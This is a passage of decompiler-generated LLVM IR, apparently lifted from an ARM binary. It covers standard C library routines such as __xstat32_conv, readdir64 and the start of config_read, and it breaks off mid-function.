  %v2_15518 = add i32 %v1_15518, 52
  %v3_15518 = inttoptr i32 %v2_15518 to i32*
  store i32 %v0_15518, i32* %v3_15518, align 4
  %v0_1551c = load i32, i32* %r2.global-to-local, align 4
  %v1_1551c = load i32, i32* %r5.global-to-local, align 4
  %v2_1551c = add i32 %v1_1551c, 16
  %v3_1551c = inttoptr i32 %v2_1551c to i32*
  store i32 %v0_1551c, i32* %v3_1551c, align 4
  %v0_15520 = load i32, i32* %r6.global-to-local, align 4
  %v1_15520 = add i32 %v0_15520, 88
  store i32 %v1_15520, i32* %r3.global-to-local, align 4
  %v1_15524 = add i32 %v0_15520, 20
  %v2_15524 = inttoptr i32 %v1_15524 to i32*
  %v3_15524 = load i32, i32* %v2_15524, align 4
  store i32 %v3_15524, i32* %r2.global-to-local, align 4
  %v1_15528 = inttoptr i32 %v1_15520 to i32*
  %v2_15528 = load i32, i32* %v1_15528, align 4
  %v3_15528 = add i32 %v0_15520, 92
  %v4_15528 = inttoptr i32 %v3_15528 to i32*
  %v5_15528 = load i32, i32* %v4_15528, align 4
  store i32 %v5_15528, i32* %r1.global-to-local, align 4
  %v1_1552c = add i32 %v0_15520, 64
  store i32 %v1_1552c, i32* %r6.global-to-local, align 4
  %v1_15530 = inttoptr i32 %v1_1552c to i32*
  %v2_15530 = load i32, i32* %v1_15530, align 4
  store i32 %v2_15530, i32* %r6.global-to-local, align 4
  %v3_15530 = add i32 %v0_15520, 68
  %v4_15530 = inttoptr i32 %v3_15530 to i32*
  %v5_15530 = load i32, i32* %v4_15530, align 4
  store i32 %v5_15530, i32* %r7.global-to-local, align 4
  %v0_15534 = load i32, i32* %r5.global-to-local, align 4
  %v1_15534 = add i32 %v0_15534, 88
  store i32 %v1_15534, i32* %r3.global-to-local, align 4
  %v2_15538 = add i32 %v0_15534, 20
  %v3_15538 = inttoptr i32 %v2_15538 to i32*
  store i32 %v3_15524, i32* %v3_15538, align 4
  %v0_1553c = load i32, i32* %ip.global-to-local, align 4
  %v1_1553c = load i32, i32* %r5.global-to-local, align 4
  %v2_1553c = add i32 %v1_1553c, 24
  %v3_1553c = inttoptr i32 %v2_1553c to i32*
  store i32 %v0_1553c, i32* %v3_1553c, align 4
  %v0_15540 = load i32, i32* %lr.global-to-local, align 4
  %v1_15540 = load i32, i32* %r5.global-to-local, align 4
  %v2_15540 = add i32 %v1_15540, 28
  %v3_15540 = inttoptr i32 %v2_15540 to i32*
  store i32 %v0_15540, i32* %v3_15540, align 4
  %v0_15544 = load i32, i32* %r6.global-to-local, align 4
  %v1_15544 = load i32, i32* %r5.global-to-local, align 4
  %v2_15544 = add i32 %v1_15544, 64
  %v3_15544 = inttoptr i32 %v2_15544 to i32*
  store i32 %v0_15544, i32* %v3_15544, align 4
  %v0_15548 = load i32, i32* %r7.global-to-local, align 4
  %v1_15548 = load i32, i32* %r5.global-to-local, align 4
  %v2_15548 = add i32 %v1_15548, 68
  %v3_15548 = inttoptr i32 %v2_15548 to i32*
  store i32 %v0_15548, i32* %v3_15548, align 4
  %v0_1554c = load i32, i32* %r3.global-to-local, align 4
  %v1_1554c = inttoptr i32 %v0_1554c to i32*
  store i32 %v2_15528, i32* %v1_1554c, align 4
  %v3_1554c = add i32 %v0_1554c, 4
  %v4_1554c = inttoptr i32 %v3_1554c to i32*
  %v5_1554c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1554c, i32* %v4_1554c, align 4
  %v2_15550 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_15550, i32* %r4.global-to-local, align 4
  ret i32 %v2_15528

; uselistorder directives
  uselistorder i32 %v0_15520, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_154f8, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 3, 8, 4, 5, 6, 7, 9 }
  uselistorder i32* %r5.global-to-local, { 8, 0, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @__xstat32_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_15558 = load i32, i32* @r4, align 4
  store i32 %v3_15558, i32* %stack_var_-16, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 88, i32* %r2.global-to-local, align 4
  %v3_15570 = inttoptr i32 %arg2 to i8*
  %v4_15570 = call i32 @__GI_memset(i8* %v3_15570, i32 0, i32 88)
  %v2_15574 = load i32, i32* %arg1, align 4
  %v3_15574 = add i32 %tmp, 4
  %v4_15574 = inttoptr i32 %v3_15574 to i32*
  %v5_15574 = load i32, i32* %v4_15574, align 4
  store i32 %v5_15574, i32* %r4.global-to-local, align 4
  %v0_15578 = load i32, i32* %r6.global-to-local, align 4
  %v1_15578 = inttoptr i32 %v0_15578 to i32*
  store i32 %v2_15574, i32* %v1_15578, align 4
  %v3_15578 = add i32 %v0_15578, 4
  %v4_15578 = inttoptr i32 %v3_15578 to i32*
  %v5_15578 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_15578, i32* %v4_15578, align 4
  %v0_1557c = load i32, i32* %r5.global-to-local, align 4
  %v1_1557c = add i32 %v0_1557c, 32
  %v1_15580 = inttoptr i32 %v1_1557c to i32*
  %v2_15580 = load i32, i32* %v1_15580, align 4
  %v3_15580 = add i32 %v0_1557c, 36
  %v4_15580 = inttoptr i32 %v3_15580 to i32*
  %v5_15580 = load i32, i32* %v4_15580, align 4
  store i32 %v5_15580, i32* %r4.global-to-local, align 4
  %v1_15584 = add i32 %v0_1557c, 96
  %v2_15584 = inttoptr i32 %v1_15584 to i32*
  %v3_15584 = load i32, i32* %v2_15584, align 4
  store i32 %v3_15584, i32* %r2.global-to-local, align 4
  %v1_15588 = load i32, i32* %r6.global-to-local, align 4
  %v2_15588 = add i32 %v1_15588, 32
  %v3_15588 = inttoptr i32 %v2_15588 to i32*
  store i32 %v2_15580, i32* %v3_15588, align 4
  %v0_1558c = load i32, i32* %r4.global-to-local, align 4
  %v1_1558c = load i32, i32* %r6.global-to-local, align 4
  %v2_1558c = add i32 %v1_1558c, 36
  %v3_1558c = inttoptr i32 %v2_1558c to i32*
  store i32 %v0_1558c, i32* %v3_1558c, align 4
  %v0_15590 = load i32, i32* %r2.global-to-local, align 4
  %v1_15590 = load i32, i32* %r6.global-to-local, align 4
  %v2_15590 = add i32 %v1_15590, 12
  %v3_15590 = inttoptr i32 %v2_15590 to i32*
  store i32 %v0_15590, i32* %v3_15590, align 4
  %v0_15594 = load i32, i32* %r5.global-to-local, align 4
  %v1_15594 = add i32 %v0_15594, 48
  %v2_15594 = inttoptr i32 %v1_15594 to i32*
  %v3_15594 = load i32, i32* %v2_15594, align 4
  %v1_15598 = add i32 %v0_15594, 24
  store i32 %v1_15598, i32* %ip.global-to-local, align 4
  %v1_1559c = inttoptr i32 %v1_15598 to i32*
  %v2_1559c = load i32, i32* %v1_1559c, align 4
  store i32 %v2_1559c, i32* %ip.global-to-local, align 4
  %v3_1559c = add i32 %v0_15594, 28
  %v4_1559c = inttoptr i32 %v3_1559c to i32*
  %v5_1559c = load i32, i32* %v4_1559c, align 4
  store i32 %v5_1559c, i32* %lr.global-to-local, align 4
  %v1_155a0 = load i32, i32* %r6.global-to-local, align 4
  %v2_155a0 = add i32 %v1_155a0, 44
  %v3_155a0 = inttoptr i32 %v2_155a0 to i32*
  store i32 %v3_15594, i32* %v3_155a0, align 4
  %v0_155a4 = load i32, i32* %r5.global-to-local, align 4
  %v1_155a4 = add i32 %v0_155a4, 64
  %v2_155a4 = inttoptr i32 %v1_155a4 to i32*
  %v3_155a4 = load i32, i32* %v2_155a4, align 4
  %v1_155a8 = add i32 %v0_155a4, 56
  %v2_155a8 = inttoptr i32 %v1_155a8 to i32*
  %v3_155a8 = load i32, i32* %v2_155a8, align 4
  store i32 %v3_155a8, i32* %r2.global-to-local, align 4
  %v1_155ac = load i32, i32* %r6.global-to-local, align 4
  %v2_155ac = add i32 %v1_155ac, 52
  %v3_155ac = inttoptr i32 %v2_155ac to i32*
  store i32 %v3_155a4, i32* %v3_155ac, align 4
  %v0_155b0 = load i32, i32* %r2.global-to-local, align 4
  %v1_155b0 = load i32, i32* %r6.global-to-local, align 4
  %v2_155b0 = add i32 %v1_155b0, 48
  %v3_155b0 = inttoptr i32 %v2_155b0 to i32*
  store i32 %v0_155b0, i32* %v3_155b0, align 4
  %v0_155b4 = load i32, i32* %r5.global-to-local, align 4
  %v1_155b4 = add i32 %v0_155b4, 72
  %v1_155b8 = inttoptr i32 %v1_155b4 to i32*
  %v2_155b8 = load i32, i32* %v1_155b8, align 4
  %v3_155b8 = add i32 %v0_155b4, 76
  %v4_155b8 = inttoptr i32 %v3_155b8 to i32*
  %v5_155b8 = load i32, i32* %v4_155b8, align 4
  store i32 %v5_155b8, i32* %r1.global-to-local, align 4
  %v0_155bc = load i32, i32* %r6.global-to-local, align 4
  %v1_155bc = add i32 %v0_155bc, 56
  %v1_155c0 = inttoptr i32 %v1_155bc to i32*
  store i32 %v2_155b8, i32* %v1_155c0, align 4
  %v3_155c0 = add i32 %v0_155bc, 60
  %v4_155c0 = inttoptr i32 %v3_155c0 to i32*
  %v5_155c0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_155c0, i32* %v4_155c0, align 4
  %v0_155c4 = load i32, i32* %r5.global-to-local, align 4
  %v1_155c4 = add i32 %v0_155c4, 80
  %v1_155c8 = inttoptr i32 %v1_155c4 to i32*
  %v2_155c8 = load i32, i32* %v1_155c8, align 4
  %v3_155c8 = add i32 %v0_155c4, 84
  %v4_155c8 = inttoptr i32 %v3_155c8 to i32*
  %v5_155c8 = load i32, i32* %v4_155c8, align 4
  store i32 %v5_155c8, i32* %r1.global-to-local, align 4
  %v0_155cc = load i32, i32* %r6.global-to-local, align 4
  %v1_155cc = add i32 %v0_155cc, 64
  %v1_155d0 = inttoptr i32 %v1_155cc to i32*
  store i32 %v2_155c8, i32* %v1_155d0, align 4
  %v3_155d0 = add i32 %v0_155cc, 68
  %v4_155d0 = inttoptr i32 %v3_155d0 to i32*
  %v5_155d0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_155d0, i32* %v4_155d0, align 4
  %v0_155d4 = load i32, i32* %r5.global-to-local, align 4
  %v1_155d4 = add i32 %v0_155d4, 16
  %v2_155d4 = inttoptr i32 %v1_155d4 to i32*
  %v3_155d4 = load i32, i32* %v2_155d4, align 4
  %v1_155d8 = load i32, i32* %r6.global-to-local, align 4
  %v2_155d8 = add i32 %v1_155d8, 16
  %v3_155d8 = inttoptr i32 %v2_155d8 to i32*
  store i32 %v3_155d4, i32* %v3_155d8, align 4
  %v0_155dc = load i32, i32* %r5.global-to-local, align 4
  %v1_155dc = add i32 %v0_155dc, 88
  %v1_155e0 = add i32 %v0_155dc, 20
  %v2_155e0 = inttoptr i32 %v1_155e0 to i32*
  %v3_155e0 = load i32, i32* %v2_155e0, align 4
  store i32 %v3_155e0, i32* %r2.global-to-local, align 4
  %v1_155e4 = inttoptr i32 %v1_155dc to i32*
  %v2_155e4 = load i32, i32* %v1_155e4, align 4
  %v3_155e4 = add i32 %v0_155dc, 92
  %v4_155e4 = inttoptr i32 %v3_155e4 to i32*
  %v5_155e4 = load i32, i32* %v4_155e4, align 4
  store i32 %v5_155e4, i32* %r1.global-to-local, align 4
  %v0_155e8 = load i32, i32* %r6.global-to-local, align 4
  %v1_155e8 = add i32 %v0_155e8, 72
  %v1_155ec = inttoptr i32 %v1_155e8 to i32*
  store i32 %v2_155e4, i32* %v1_155ec, align 4
  %v3_155ec = add i32 %v0_155e8, 76
  %v4_155ec = inttoptr i32 %v3_155ec to i32*
  %v5_155ec = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_155ec, i32* %v4_155ec, align 4
  %v0_155f0 = load i32, i32* %r2.global-to-local, align 4
  %v1_155f0 = load i32, i32* %r6.global-to-local, align 4
  %v2_155f0 = add i32 %v1_155f0, 20
  %v3_155f0 = inttoptr i32 %v2_155f0 to i32*
  store i32 %v0_155f0, i32* %v3_155f0, align 4
  %v0_155f4 = load i32, i32* %ip.global-to-local, align 4
  %v1_155f4 = load i32, i32* %r6.global-to-local, align 4
  %v2_155f4 = add i32 %v1_155f4, 24
  %v3_155f4 = inttoptr i32 %v2_155f4 to i32*
  store i32 %v0_155f4, i32* %v3_155f4, align 4
  %v0_155f8 = load i32, i32* %lr.global-to-local, align 4
  %v1_155f8 = load i32, i32* %r6.global-to-local, align 4
  %v2_155f8 = add i32 %v1_155f8, 28
  %v3_155f8 = inttoptr i32 %v2_155f8 to i32*
  store i32 %v0_155f8, i32* %v3_155f8, align 4
  %v2_155fc = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_155fc, i32* %r4.global-to-local, align 4
  ret i32 %v2_155e4

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 96, { 5, 3, 4, 1, 2, 0, 6, 7 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @readdir64(i32* %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32* @r6, align 4
  %v1_15618 = add i32 %tmp, 24
  store i32 %v1_15618, i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_15630 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 112) to i32*), align 4
  store i32 %v4_15630, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_15630)
  %v0_15644 = load i32, i32* @r6, align 4
  %v2_15644 = add i32 %v0_15644, 16
  %v3_15644 = inttoptr i32 %v2_15644 to i32*
  %v4_15644 = load i32, i32* %v3_15644, align 4
  store i32 %v4_15644, i32* %ip.global-to-local, align 4
  store i32 87632, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_15644)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_15654

dec_label_pc_15654:                               ; preds = %dec_label_pc_15684, %entry
  %v0_15654 = load i32, i32* @r5, align 4
  %v1_15654 = add i32 %v0_15654, 4
  %v2_15654 = inttoptr i32 %v1_15654 to i32*
  %v3_15654 = load i32, i32* %v2_15654, align 4
  %v4_15654 = add i32 %v0_15654, 8
  %v5_15654 = inttoptr i32 %v4_15654 to i32*
  %v6_15654 = load i32, i32* %v5_15654, align 4
  %tmp10 = icmp ugt i32 %v6_15654, %v3_15654
  br i1 %tmp10, label %dec_label_pc_15684, label %dec_label_pc_15660

dec_label_pc_15660:                               ; preds = %dec_label_pc_15654
  %v1_15660 = inttoptr i32 %v0_15654 to i32*
  %v2_15660 = load i32, i32* %v1_15660, align 4
  %v1_15664 = add i32 %v0_15654, 12
  %v2_15664 = inttoptr i32 %v1_15664 to i32*
  %v3_15664 = load i32, i32* %v2_15664, align 4
  %v1_15668 = add i32 %v0_15654, 20
  %v2_15668 = inttoptr i32 %v1_15668 to i32*
  %v3_15668 = load i32, i32* %v2_15668, align 4
  %v4_1566c = inttoptr i32 %v3_15664 to i32*
  %v5_1566c = call i32 @__getdents64(i32 %v2_15660, i32* %v4_1566c, i32 %v3_15668, i32 %v6_15654)
  %tmp9 = icmp slt i32 %v5_1566c, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_1567c

.thread:                                          ; preds = %dec_label_pc_15660
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_156b4

dec_label_pc_1567c:                               ; preds = %dec_label_pc_15660
  %v1_1567c = load i32, i32* @r5, align 4
  %v2_1567c = add i32 %v1_1567c, 8
  %v3_1567c = inttoptr i32 %v2_1567c to i32*
  store i32 %v5_1566c, i32* %v3_1567c, align 4
  %v0_15680 = load i32, i32* @r7, align 4
  %v1_15680 = load i32, i32* @r5, align 4
  %v2_15680 = add i32 %v1_15680, 4
  %v3_15680 = inttoptr i32 %v2_15680 to i32*
  store i32 %v0_15680, i32* %v3_15680, align 4
  %v0_15684.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15684

dec_label_pc_15684:                               ; preds = %dec_label_pc_15654, %dec_label_pc_1567c
  %v1_156a8 = phi i32 [ %v0_15654, %dec_label_pc_15654 ], [ %v0_15684.pre, %dec_label_pc_1567c ]
  %v1_15684 = add i32 %v1_156a8, 4
  %v2_15684 = inttoptr i32 %v1_15684 to i32*
  %v3_15684 = load i32, i32* %v2_15684, align 4
  %v1_15688 = add i32 %v1_156a8, 12
  %v2_15688 = inttoptr i32 %v1_15688 to i32*
  %v3_15688 = load i32, i32* %v2_15688, align 4
  %v2_1568c = add i32 %v3_15688, %v3_15684
  store i32 %v2_1568c, i32* @r4, align 4
  %v3_15690 = inttoptr i32 %v2_1568c to i32*
  %v4_15690 = load i32, i32* %v3_15690, align 4
  %v1_15694 = add i32 %v2_1568c, 4
  %v2_15694 = inttoptr i32 %v1_15694 to i32*
  %v3_15694 = load i32, i32* %v2_15694, align 4
  %v1_15698 = add i32 %v2_1568c, 16
  %v2_15698 = inttoptr i32 %v1_15698 to i16*
  %v3_15698 = load i16, i16* %v2_15698, align 2
  %v4_15698 = zext i16 %v3_15698 to i32
  %v1_1569c = add i32 %v2_1568c, 8
  %v2_1569c = inttoptr i32 %v1_1569c to i32*
  %v3_1569c = load i32, i32* %v2_1569c, align 4
  store i32 %v3_1569c, i32* %ip.global-to-local, align 4
  %v2_156a0 = add i32 %v4_15698, %v3_15684
  %v2_156a4 = or i32 %v3_15694, %v4_15690
  %v4_156a4 = icmp eq i32 %v2_156a4, 0
  store i32 %v2_156a0, i32* %v2_15684, align 4
  %v0_156ac = load i32, i32* %ip.global-to-local, align 4
  %v1_156ac = load i32, i32* @r5, align 4
  %v2_156ac = add i32 %v1_156ac, 16
  %v3_156ac = inttoptr i32 %v2_156ac to i32*
  store i32 %v0_156ac, i32* %v3_156ac, align 4
  br i1 %v4_156a4, label %dec_label_pc_15654, label %dec_label_pc_156b4

dec_label_pc_156b4:                               ; preds = %dec_label_pc_15684, %.thread
  %v0_156c0 = load i32, i32* @r6, align 4
  %v2_156c0 = add i32 %v0_156c0, 44
  %v3_156c0 = inttoptr i32 %v2_156c0 to i32*
  %v4_156c0 = load i32, i32* %v3_156c0, align 4
  store i32 %v4_156c0, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_156c0)
  %v0_156cc = load i32, i32* @r4, align 4
  ret i32 %v0_156cc

; uselistorder directives
  uselistorder i32 %v2_1568c, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_156a8, { 1, 0 }
  uselistorder i32 %v6_15654, { 1, 0 }
  uselistorder i32 %v0_15654, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 112, { 1, 2, 3, 0, 4 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 112) to i32*), { 0, 1, 2, 3, 4, 7, 5, 6 }
  uselistorder label %dec_label_pc_15684, { 1, 0 }
}

define i32 @function_156e0(i32 %arg1) local_unnamed_addr {
dec_label_pc_156e0:
  %v0_156e0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_156e0, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_156e0
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_156e0, %bb
  %v4_156ec = phi i32 [ %arg1, %dec_label_pc_156e0 ], [ 0, %bb ]
  ret i32 %v4_156ec

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI_config_read(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_156f0 = load i32, i32* @r4, align 4
  %v6_156f0 = load i32, i32* @r5, align 4
  %v9_156f0 = load i32, i32* @r6, align 4
  %v12_156f0 = load i32, i32* @r7, align 4
  %v15_156f0 = load i32, i32* @r8, align 4
  %v18_156f0 = load i32, i32* @sb, align 4
  %v21_156f0 = load i32, i32* @sl, align 4
  %v24_156f0 = load i32, i32* @fp, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_156f4 = icmp eq i32* %arg1, null
  store i1 %v2_156f4, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg4, i32* @r7, align 4
  br i1 %v2_156f4, label %dec_label_pc_15a04, label %dec_label_pc_1570c

dec_label_pc_1570c:                               ; preds = %entry
  %v1_1570c = urem i32 %arg3, 256
  store i32 %v1_1570c, i32* @sb, align 4
  %v1_15710 = udiv i32 %arg3, 256
  %v3_15714 = urem i32 %v1_15710, 256
  %v3_15718 = mul nuw nsw i32 %v1_1570c, 4
  %v1_15720 = or i32 %v3_15718, 1
  %v1_1572c = and i32 %arg3, 131072
  %v1_15730 = add nsw i32 %v1_1570c, -1
  %v1_1573c = and i32 %arg3, 262144
  store i32 %v1_1573c, i32* %r2.global-to-local, align 4
  %v1_15740 = and i32 %arg3, 65536
  store i32 %v1_15740, i32* %r3.global-to-local, align 4
  store i32 %v1_15740, i32* %stack_var_-72, align 4
  store i32 0, i32* @fp, align 4
  %v1_15750 = add i32 %arg4, 1
  store i32 %v1_15750, i32* @sl, align 4
  %v2_158c8 = icmp eq i32 %v1_1572c, 0
  %v1_15920 = inttoptr i32 %arg2 to i32*
  %v2_15938 = icmp eq i32 %v1_1573c, 0
  br label %dec_label_pc_15754

dec_label_pc_15754:                               ; preds = %dec_label_pc_15754.backedge, %dec_label_pc_1570c
  %v2_15770 = phi i32 [ %v0_15754.pre, %dec_label_pc_15754.backedge ], [ %tmp, %dec_label_pc_1570c ]
  %v1_15754 = add i32 %v2_15770, 4
  %v2_15754 = inttoptr i32 %v1_15754 to i32*
  %v3_15754 = load i32, i32* %v2_15754, align 4
  store i32 %v3_15754, i32* %r3.global-to-local, align 4
  %v2_15758 = icmp eq i32 %v3_15754, 0
  store i1 %v2_15758, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15758, label %dec_label_pc_15760, label %dec_label_pc_157a8

dec_label_pc_15760:                               ; preds = %dec_label_pc_15754
  %v1_15760 = add i32 %v2_15770, 16
  %v2_15760 = inttoptr i32 %v1_15760 to i32*
  %v3_15760 = load i32, i32* %v2_15760, align 4
  store i32 %v3_15760, i32* %r3.global-to-local, align 4
  %v2_15764 = icmp eq i32 %v3_15760, 0
  store i1 %v2_15764, i1* %cpsr_z.global-to-local, align 1
  %v1_15768 = add i32 %v2_15770, 8
  %v2_15768 = inttoptr i32 %v1_15768 to i32*
  %v3_15768 = load i32, i32* %v2_15768, align 4
  store i32 %v3_15768, i32* %r3.global-to-local, align 4
  br i1 %v2_15764, label %bb, label %bb64

bb:                                               ; preds = %dec_label_pc_15760
  store i32 81, i32* %r2.global-to-local, align 4
  store i32 81, i32* %v2_15760, align 4
  %v0_15774.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb64

bb64:                                             ; preds = %dec_label_pc_15760, %bb
  %v0_15774 = phi i32 [ %v0_15774.pre, %bb ], [ %v3_15768, %dec_label_pc_15760 ]
  %v2_15774 = icmp eq i32 %v0_15774, 0
  store i1 %v2_15774, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15774, label %bb65, label %.thread

bb65:                                             ; preds = %bb64
  store i32 %v1_15720, i32* %r3.global-to-local, align 4
  %v2_1577c = load i32, i32* @r5, align 4
  %v3_1577c = add i32 %v2_1577c, 8
  %v4_1577c = inttoptr i32 %v3_1577c to i32*
  store i32 %v1_15720, i32* %v4_1577c, align 4
  br label %.thread

.thread:                                          ; preds = %bb64, %bb65
  %v0_15780 = load i32, i32* @r5, align 4
  %v1_15780 = add i32 %v0_15780, 16
  %v2_15780 = inttoptr i32 %v1_15780 to i32*
  %v3_15780 = load i32, i32* %v2_15780, align 4
  store i32 %v3_15780, i32* %r0.global-to-local, align 4
  %v1_15784 = add i32 %v0_15780, 8
  %v2_15784 = inttoptr i32 %v1_15784 to i32*
  %v3_15784 = load i32, i32* %v2_15784, align 4
  store i32 %v3_15784, i32* %r3.global-to-local, align 4
  %v2_15788 = add i32 %v3_15784, %v3_15780
  store i32 %v2_15788, i32* @r0, align 4
  %v0_1578c = call i32 @malloc()
  store i32 %v0_1578c, i32* %r0.global-to-local, align 4
  %v2_15790 = icmp eq i32 %v0_1578c, 0
  store i1 %v2_15790, i1* %cpsr_z.global-to-local, align 1
  %v1_15794 = load i32, i32* @r5, align 4
  %v2_15794 = add i32 %v1_15794, 4
  %v3_15794 = inttoptr i32 %v2_15794 to i32*
  store i32 %v0_1578c, i32* %v3_15794, align 4
  br i1 %v2_15790, label %dec_label_pc_15a04, label %dec_label_pc_1579c

dec_label_pc_1579c:                               ; preds = %.thread
  %v0_1579c = load i32, i32* @r5, align 4
  %v1_1579c = add i32 %v0_1579c, 20
  %v2_1579c = inttoptr i32 %v1_1579c to i32*
  %v3_1579c = load i32, i32* %v2_1579c, align 4
  %v1_157a0 = or i32 %v3_1579c, 1
  store i32 %v1_157a0, i32* %r3.global-to-local, align 4
  store i32 %v1_157a0, i32* %v2_1579c, align 4
  %v0_157a8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_157a8

dec_label_pc_157a8:                               ; preds = %dec_label_pc_15754, %dec_label_pc_1579c
  %v1_157b0 = phi i32 [ %v2_15770, %dec_label_pc_15754 ], [ %v0_157a8.pre, %dec_label_pc_1579c ]
  %v1_157a8 = add i32 %v1_157b0, 4
  %v2_157a8 = inttoptr i32 %v1_157a8 to i32*
  %v3_157a8 = load i32, i32* %v2_157a8, align 4
  store i32 %v3_157a8, i32* %r2.global-to-local, align 4
  %v4_157a8 = add i32 %v1_157b0, 8
  %v5_157a8 = inttoptr i32 %v4_157a8 to i32*
  %v6_157a8 = load i32, i32* %v5_157a8, align 4
  %v2_157ac = add i32 %v6_157a8, %v3_157a8
  store i32 %v2_157ac, i32* %r3.global-to-local, align 4
  %v2_157b0 = add i32 %v1_157b0, 12
  %v3_157b0 = inttoptr i32 %v2_157b0 to i32*
  store i32 %v2_157ac, i32* %v3_157b0, align 4
  %v0_157b4 = load i32, i32* @fp, align 4
  store i32 %v0_157b4, i32* @r6, align 4
  br label %dec_label_pc_157b8

dec_label_pc_157b8:                               ; preds = %dec_label_pc_15844, %dec_label_pc_15830, %dec_label_pc_157a8
  %v0_157c0 = phi i32 [ %v0_157b4, %dec_label_pc_157a8 ], [ %v1_15830, %dec_label_pc_15830 ], [ %v0_157c0.pre.pre, %dec_label_pc_15844 ]
  %v0_157b8 = load i32, i32* @r5, align 4
  %v1_157b8 = add i32 %v0_157b8, 12
  store i32 %v1_157b8, i32* %r0.global-to-local, align 4
  %v1_157bc = inttoptr i32 %v1_157b8 to i32*
  %v2_157bc = load i32, i32* %v1_157bc, align 4
  store i32 %v2_157bc, i32* %r0.global-to-local, align 4
  %v3_157bc = add i32 %v0_157b8, 16
  %v4_157bc = inttoptr i32 %v3_157bc to i32*
  %v5_157bc = load i32, i32* %v4_157bc, align 4
  %v2_157c0 = add i32 %v2_157bc, %v0_157c0
  store i32 %v2_157c0, i32* %r0.global-to-local, align 4
  %v2_157c4 = sub i32 %v5_157bc, %v0_157c0
  %v1_157c8 = inttoptr i32 %v0_157b8 to i32*
  %v2_157c8 = load i32, i32* %v1_157c8, align 4
  store i32 %v2_157c8, i32* %r2.global-to-local, align 4
  %v3_157cc = call i32 @fgets(i32 %v2_157c0, i32 %v2_157c4, i32 %v2_157c8)
  store i32 %v3_157cc, i32* %r0.global-to-local, align 4
  store i32 %v3_157cc, i32* %r4.global-to-local, align 4
  %v2_157d0 = icmp eq i32 %v3_157cc, 0
  store i1 %v2_157d0, i1* %cpsr_z.global-to-local, align 1
  %v0_157d8 = load i32, i32* @r5, align 4
  %v1_157d8 = add i32 %v0_157d8, 12
  br i1 %v2_157d0, label %dec_label_pc_157d8, label %dec_label_pc_157f0

dec_label_pc_157d8:                               ; preds = %dec_label_pc_157b8
  store i32 %v1_157d8, i32* %r0.global-to-local, align 4
  %v1_157dc = inttoptr i32 %v1_157d8 to i32*
  %v2_157dc = load i32, i32* %v1_157dc, align 4
  store i32 %v2_157dc, i32* %r0.global-to-local, align 4
  %v3_157dc = add i32 %v0_157d8, 16
  %v4_157dc = inttoptr i32 %v3_157dc to i32*
  %v5_157dc = load i32, i32* %v4_157dc, align 4
  store i32 %v5_157dc, i32* %r2.global-to-local, align 4
  %v3_157e4 = inttoptr i32 %v2_157dc to i8*
  %v4_157e4 = call i32 @__GI_memset(i8* %v3_157e4, i32 0, i32 %v5_157dc)
